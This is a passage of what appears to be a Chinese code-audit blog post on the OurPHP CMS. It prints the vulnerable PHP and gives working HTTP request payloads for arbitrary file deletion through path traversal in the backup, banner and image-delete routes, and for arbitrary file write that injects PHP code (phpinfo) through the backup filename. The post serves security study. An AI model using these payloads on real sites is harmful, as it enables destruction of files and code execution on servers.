<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//是否有多余的文件</span><br><span class="hljs-variable">$dfileNo</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$open</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;dir&quot;</span>]);<br><span class="hljs-variable">$delhtml</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$afilename</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$open</span>) <span class="hljs-keyword">and</span> !<span class="hljs-variable">$_POST</span>[filedeled])&#123;<br>	<span class="hljs-variable">$checked</span>=<span class="hljs-string">&quot;&quot;</span>;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$afilename</span>,<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[filename]))==<span class="hljs-variable">$_POST</span>[filename])&#123;<br>		<span class="hljs-variable">$checked</span>=<span class="hljs-string">&quot;checked&quot;</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$_POST</span>[dir]/<span class="hljs-subst">$afilename</span>&quot;</span>))&#123;<br>		<span class="hljs-variable">$delhtml</span>.=<span class="hljs-title function_ invoke__">tabledata</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$afilename</span>|&quot;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>,<span class="hljs-title function_ invoke__">filectime</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$_POST</span>[dir]/<span class="hljs-subst">$afilename</span>&quot;</span>)).<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-title function_ invoke__">num_bitunit</span>(<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$_POST</span>[dir]/<span class="hljs-subst">$afilename</span>&quot;</span>)).<span class="hljs-string">&quot;|&lt;center&gt;&lt;input name=&#x27;dfile[<span class="hljs-subst">$dfileNo</span>]&#x27; type=&#x27;checkbox&#x27; value=&#x27;<span class="hljs-subst">$_POST</span>[dir]/<span class="hljs-subst">$afilename</span>&#x27; <span class="hljs-subst">$checked</span>&gt;&lt;/center&gt;&quot;</span>);<br>		<span class="hljs-variable">$dfileNo</span>++;<br>	&#125;<br>&#125;<br>   <br><span class="hljs-comment">//多余文件处理</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$dfileNo</span>)&#123;<br>	<span class="hljs-variable">$_POST</span>[filedeled]=<span class="hljs-number">1</span>;<br>	<span class="hljs-title function_ invoke__">fheader</span>();<br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">tabletext</span>(<span class="hljs-string">&quot;&#x27;<span class="hljs-subst">$_POST</span>[dir]/&#x27;中以下文件已存在，它们可能被覆盖或成为额外的文件。&lt;br&gt;您可以有选择地删除它们或返回上一步重新设定：&quot;</span>,<span class="hljs-string">&quot;98%&quot;</span>);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">tablestart</span>(<span class="hljs-string">&quot;选择要删除的文件：&quot;</span>,<span class="hljs-string">&quot;100%&quot;</span>);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">tabledata</span>(<span class="hljs-string">&quot;&lt;strong&gt;文件名&lt;/strong&gt;|&lt;strong&gt;修改日期&lt;/strong&gt;|&lt;strong&gt;大小&lt;/strong&gt;|&lt;center&gt;&lt;strong&gt;反选&lt;/strong&gt;&lt;input type=&#x27;checkbox&#x27; name=&#x27;checkbox&#x27; value=&#x27;&#x27; onclick=&#x27;selrev();&#x27;&gt;&lt;/center&gt;&quot;</span>,<span class="hljs-string">&quot;31%|32%|21%|16%&quot;</span>);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$delhtml</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">tableend</span>();<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">	&lt;script language=&#x27;JavaScript&#x27;&gt;</span><br><span class="hljs-string">	function selrev() &#123;</span><br><span class="hljs-string">		with(myform) &#123;</span><br><span class="hljs-string">			for(i=0;i&lt;elements.length;i++) &#123;</span><br><span class="hljs-string">				thiselm = elements[i];</span><br><span class="hljs-string">				if(thiselm.name.match(/dfile\[\w+\]/))	thiselm.checked = !thiselm.checked;</span><br><span class="hljs-string">			&#125;</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">	&lt;/script&gt;&quot;</span>;<br>	<span class="hljs-title function_ invoke__">fbutton</span>(<span class="hljs-string">&#x27;submit&#x27;</span>,<span class="hljs-string">&#x27;dosubmit&#x27;</span>,<span class="hljs-string">&#x27;删除并继续&#x27;</span>);<br>	<span class="hljs-title function_ invoke__">fbutton</span>(<span class="hljs-string">&#x27;reset&#x27;</span>,<span class="hljs-string">&#x27;doreset&#x27;</span>,<span class="hljs-string">&#x27;重置&#x27;</span>);<br>	<span class="hljs-title function_ invoke__">ffooter</span>();<br>	<span class="hljs-keyword">exit</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>然后保证有back_type这个参数为partsave即可</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206094929649.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206094929649.png" alt="image-20221206094929649"></p>
</li>
<li><p>再往上，有一个POST传参</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206095659351.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206095659351.png" alt="image-20221206095659351"></p>
<p>action参数需要满足databackup</p>
</li>
<li><p>在往上有个eval语句，跟入看一下</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206100638563.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206100638563.png" alt="image-20221206100638563"></p>
<p>首先是<code>frameset_html()</code>，需要控制参数framename值不让程序提前结束</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206100846421.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206100846421.png" alt="image-20221206100846421"></p>
<p>我们在根目录创建一个目录</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206095434915.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206095434915.png" alt="image-20221206095434915"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">filedeled=1&amp;dfile[]=../../test/RacerZ&amp;back_type=partsave&amp;dir=../../function/backup/&amp;action=databackup<br></code></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="任意文件写入2"><a href="#任意文件写入2" class="headerlink" title="任意文件写入2"></a>任意文件写入2</h4><p>还是看数据库备份功能，这里用户可控参数<code>filename</code>被直接进行了拼接到data中，然后调用<code>writefile()</code>，跟进</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206114213224.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206114213224.png" alt="image-20221206114213224"></p>
<p>这里就有一个文件写入操作，且可以看到后缀名为.php</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206114357670.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206114357670.png" alt="image-20221206114357670"></p>
<p>当然这个文件的内容由于同时也会出现在文件名中，所以是否能执行依赖于不同的操作系统</p>
<p>当然前面还要绕过那些exit影响的判断句，多了一个page判断</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206115050231.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206115050231.png" alt="image-20221206115050231"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">filename=1; phpinfo(); //<br>&amp;dir=../../function/backup/&amp;action=databackup&amp;page=1&amp;back_type=partsave<br></code></pre></td></tr></table></figure>
<h4 id="任意文件删除2"><a href="#任意文件删除2" class="headerlink" title="任意文件删除2"></a>任意文件删除2</h4><p>Banner管理这里也支持删除功能，我们针对路由<code>client/manage/ourphp_banner.php?ourphp_cms=del&amp;id=2</code>看下</p>
<p>OP_Adminpower不用管经过调试会满足条件；然后是outphp_rs[0]参数可以从数据库里取</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206103709199.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206103709199.png" alt="image-20221206103709199"></p>
<p>同时后台是提供了添加Banner的功能的，所以直接添加就好，对应会去执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$db</span> -&gt; <span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">&quot;`ourphp_banner`&quot;</span>,<span class="hljs-string">&quot;`OP_Bannerimg` = &#x27;&quot;</span>.<span class="hljs-variable">$ourphp_xiegang</span>.<span class="hljs-string">&quot;&#x27;,`OP_Bannertitle` = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">admin_sql</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;OP_Bannertitle&quot;</span>]).<span class="hljs-string">&quot;&#x27;,`OP_Bannerurl` = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">admin_sql</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;OP_Bannerurl&quot;</span>]).<span class="hljs-string">&quot;&#x27;,`OP_Bannerlang` = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">admin_sql</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;OP_Bannerlang&quot;</span>]).<span class="hljs-string">&quot;&#x27;,`time` = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>).<span class="hljs-string">&quot;&#x27;,`OP_Bannerclass` = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">admin_sql</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;OP_Bannerclass&quot;</span>]).<span class="hljs-string">&quot;&#x27;,`OP_Bannertext` = &#x27;&quot;</span>.<span class="hljs-variable">$ourphp_text</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>我们设置好<code>OP_Bannerimg</code>字段，这里先往后看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">OP_Bannerlang=cn&amp;OP_Bannertitle=a&amp;OP_Bannertext%5B%5D=b&amp;OP_Bannertext%5B%5D=c&amp;OP_Bannertext%5B%5D=d&amp;OP_Bannerimg=&lt;exploit&gt;&amp;OP_Bannerurl=http%3A%2F%2F&amp;OP_Bannerclass=0&amp;submit=%E6%8F%90+%E4%BA%A4<br></code></pre></td></tr></table></figure>
<p>这里还有一个需要满足的是查出来的OP_Webfile字段需要为2</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206110210560.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206110210560.png" alt="image-20221206110210560"></p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206104213220.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206104213220.png" alt="image-20221206104213220"></p>
<p>这里我在后台定位到功能管理模块，同样可以修改，对应的参数值为OP_Webfile</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206111128105.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206111128105.png" alt="image-20221206111128105"></p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206111202830.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206111202830.png" alt="image-20221206111202830"></p>
<p>之后就是可以利用了，后台修改对应模块内容即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">OP_Bannerlang=cn&amp;OP_Bannertitle=a&amp;OP_Bannertext%5B%5D=b&amp;OP_Bannertext%5B%5D=c&amp;OP_Bannertext%5B%5D=d&amp;OP_Bannerimg=./function/uploadfile/../../test/RacerZ&amp;OP_Bannerurl=http%3A%2F%2F&amp;OP_Bannerclass=0&amp;submit=%E6%8F%90+%E4%BA%A4<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206113333978.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206113333978.png" alt="image-20221206113333978"></p>
<p>通过Banner列表展示模块可以看到新插入的id值</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206105944242.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206105944242.png" alt="image-20221206105944242"></p>
<p>然后访问刚才的删除路由</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">client/manage/ourphp_banner.php?ourphp_cms=del&amp;id=4<br></code></pre></td></tr></table></figure>
<h4 id="任意文件删除3"><a href="#任意文件删除3" class="headerlink" title="任意文件删除3"></a>任意文件删除3</h4><p>路由<code>client/manage/ourphp_imgdel.php</code></p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206113722441.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206113722441.png" alt="image-20221206113722441"></p>
<p>这个太简单了，直接删就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">url=./function/uploadfile/../../test/RacerZ<br></code></pre></td></tr></table></figure>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/article/details/117818842">https://ego00.blog.csdn.net/article/details/117818842</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/115794004">https://y4tacker.blog.csdn.net/article/details/115794004</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/12/07/SM2%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/">← Next SM2国密算法实现</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/12/04/KiteCMS%E5%88%86%E6%9E%90/">跟着Y4师傅学代码审计-KiteCMS Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">任意文件写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A41"><span class="toc-number">6.</span> <span class="toc-text">任意文件删除1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A52"><span class="toc-number">7.</span> <span class="toc-text">任意文件写入2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A42"><span class="toc-number">8.</span> <span class="toc-text">任意文件删除2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A43"><span class="toc-number">9.</span> <span class="toc-text">任意文件删除3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>